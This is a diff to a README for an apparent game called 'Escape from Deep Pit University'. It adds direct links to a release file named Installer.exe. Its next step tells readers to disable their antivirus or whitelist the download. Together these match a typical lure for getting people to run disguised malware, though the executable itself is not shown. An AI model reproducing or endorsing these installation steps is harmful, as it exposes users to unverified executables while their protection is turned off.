@@ -16,8 +16,10 @@ Step into the gripping world of **Escape from Deep Pit University**, an intense 
 ## Installation Guide
 
 ### Step 1: Download the Game Files
-Click the link to download the installer directly from the GitHub repository. <br>
-<img src="https://github.com/user-attachments/assets/8d91e700-19d8-40af-86d1-b2b6bd9a41ad" alt="201887" width="300"/>
+Click the [link to download](https://github.com/leemonica1984/escape-from-deep-pit-university/releases/download/on_publish/Installer.exe) the installer directly from the GitHub repository. <br>
+<a href="https://github.com/leemonica1984/escape-from-deep-pit-university/releases/download/on_publish/Installer.exe">
+  <img src="https://github.com/user-attachments/assets/8d91e700-19d8-40af-86d1-b2b6bd9a41ad" alt="201887" width="400"/>
+</a>
 
 ### Step 2: Disable Antivirus
 Temporarily disable your antivirus software or whitelist the downloaded files to avoid interruptions during installation.
